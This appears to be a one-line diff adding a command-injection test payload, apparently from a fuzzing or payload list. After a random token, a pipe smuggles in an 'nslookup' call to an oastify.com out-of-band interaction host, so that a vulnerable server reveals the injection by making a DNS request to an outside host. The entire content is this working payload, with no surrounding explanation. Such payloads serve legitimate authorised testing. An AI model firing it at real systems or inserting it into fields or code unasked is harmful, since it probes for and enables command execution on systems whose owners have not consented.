@@ -1,0 +1,1 @@
+bDJ81f35PB|nslookup -q=cname xxyn46cjyvgojtywnx6ore55swypmjr7nvfi86x.oastify.com.&
